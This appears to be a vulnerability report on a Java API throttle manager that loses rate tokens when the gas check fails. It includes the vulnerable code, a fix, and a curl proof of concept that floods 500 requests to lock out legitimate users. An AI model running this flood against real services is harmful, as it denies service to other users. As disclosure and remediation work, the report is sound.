### Title
Rate Token Consumed Without Rollback When Gas Bucket Check Fails, Enabling Rate Bucket Exhaustion DoS

### Summary
In `ThrottleManagerImpl.throttle()`, a rate token is consumed from `rateLimitBucket` before the gas bucket check. When the gas check fails and a `ThrottleException` is thrown, the consumed rate token is never restored. The `restore()` method only replenishes gas tokens, and the caller (`ContractController`) only calls `restore()` for `InvalidParametersException`, not `ThrottleException`. An unprivileged attacker can exploit this to drain the rate bucket without any contract execution occurring, causing legitimate users to receive 429 responses.

### Finding Description
**Exact code path:**

`ThrottleManagerImpl.java` lines 37–42:
```java
public void throttle(ContractCallRequest request) {
    if (!rateLimitBucket.tryConsume(1)) {           // (1) rate token consumed
        throw new ThrottleException(...);
    } else if (!gasLimitBucket.tryConsume(...)) {   // (2) gas check fails
        throw new ThrottleException(...);            // (3) rate token NOT restored
    }
}
```

`ThrottleManagerImpl.java` lines 58–64 — `restore()` only adds back gas tokens, no rate token restoration exists anywhere:
```java
public void restore(long gas) {
    long tokens = throttleProperties.scaleGas(gas);
    if (tokens > 0) {
        gasLimitBucket.addTokens(tokens);  // gas only
    }
}
```

`ContractController.java` lines 46–50 — rollback is only wired for `InvalidParametersException`:
```java
} catch (InvalidParametersException e) {
    throttleManager.restore(request.getGas());
    throw e;
}
```

`ThrottleException` is never caught here; there is no corresponding rate-token rollback path anywhere in the codebase.

**Root cause:** The two `tryConsume` calls are not atomic and there is no compensating action when the second check fails. The failed assumption is that a `ThrottleException` from the gas check is equivalent to "no token was consumed," which is false.

**Exploit flow:**
1. Attacker sends a burst of requests with large `gas` values (e.g., `gas = gasPerSecond`) to exhaust the gas bucket in one or a few requests.
2. Gas bucket is now empty. Attacker continues sending requests at the maximum rate.
3. For each subsequent request: `rateLimitBucket.tryConsume(1)` succeeds (consuming a rate token), `gasLimitBucket.tryConsume(...)` fails (bucket empty), `ThrottleException` is thrown, rate token is silently lost.
4. The rate bucket (`requestsPerSecond = 500` default) is drained within the same 1-second window.
5. Legitimate users now receive `429 REQUEST_PER_SECOND_LIMIT_EXCEEDED` even though zero contract executions occurred.

### Impact Explanation
The rate bucket is depleted by requests that never execute any smart contract logic. Legitimate users are incorrectly throttled — they receive `429` responses attributable to the attacker's ghost requests, not to real execution load. The throttle state is distorted: the rate counter reflects N requests processed when in reality 0 contracts ran. This is a targeted, repeatable DoS on the API's rate-limiting layer. No funds are at direct risk, consistent with the Medium classification.

### Likelihood Explanation
No authentication or privilege is required — any HTTP client can POST to `/api/v1/contracts/call`. The attacker only needs to know the approximate `gasPerSecond` limit (observable by probing until a gas-limit 429 is returned) and then flood requests. The attack is fully repeatable every second as the gas bucket refills, meaning the attacker can sustain the distortion indefinitely with a low-bandwidth request loop. No special tooling beyond `curl` or a simple script is needed.

### Recommendation
Restore the rate token when the gas check fails. The simplest fix is to add a `rateLimitBucket.addTokens(1)` call before throwing the gas-limit `ThrottleException`:

```java
} else if (!gasLimitBucket.tryConsume(throttleProperties.scaleGas(request.getGas()))) {
    rateLimitBucket.addTokens(1);   // compensate for the already-consumed rate token
    throw new ThrottleException(GAS_PER_SECOND_LIMIT_EXCEEDED);
}
```

Alternatively, restructure `throttle()` to check the gas bucket first (or use a single atomic probe on both buckets before consuming either), and extend `restore()` / the `ThrottleManager` interface to support rate-token restoration so the controller can handle it uniformly.

### Proof of Concept
```
# Step 1: exhaust the gas bucket with one large-gas request
curl -X POST http://<host>/api/v1/contracts/call \
  -H "Content-Type: application/json" \
  -d '{"to":"0x0000000000000000000000000000000000000001","gas":75000000000,"data":"0x"}'
# → expect 429 "Gas per second rate limit exceeded."

# Step 2: flood requests within the same second to drain rate bucket
for i in $(seq 1 500); do
  curl -s -o /dev/null -X POST http://<host>/api/v1/contracts/call \
    -H "Content-Type: application/json" \
    -d '{"to":"0x0000000000000000000000000000000000000001","gas":75000000000,"data":"0x"}' &
done
wait
# Each request: rate token consumed, gas check fails, rate token lost.

# Step 3: legitimate user is now rate-limited
curl -X POST http://<host>/api/v1/contracts/call \
  -H "Content-Type: application/json" \
  -d '{"to":"0x0000000000000000000000000000000000000001","gas":21000,"data":"0x"}'
# → 429 "Requests per second rate limit exceeded" — despite no real execution having occurred
